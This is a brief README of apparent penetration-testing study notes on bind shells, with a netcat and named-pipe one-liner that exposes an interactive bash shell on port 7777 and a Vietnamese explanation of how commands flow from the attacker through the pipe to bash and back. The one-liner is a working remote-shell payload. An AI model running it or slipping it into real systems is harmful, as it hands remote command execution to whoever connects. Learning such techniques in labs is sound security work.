# Shells-Payloads

#Bind Shells
![Screenshot 2025-05-07 234754](https://github.com/user-attachments/assets/e72cd611-7c62-451a-a837-84b6558b63a7)
>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.110.99 7777 > /tmp/f

![Screenshot 2025-05-07 234738](https://github.com/user-attachments/assets/e28bdde1-70ee-4298-a93d-4d204fea17e0)

nc nhận lệnh từ máy hacker ghi nội dung vào /tmp/f 

cat /tmp/f đọc nội dung này gửi vào bash để thực thi

kết quả từ bash được gửi lại qua netcat và hacker nhận được

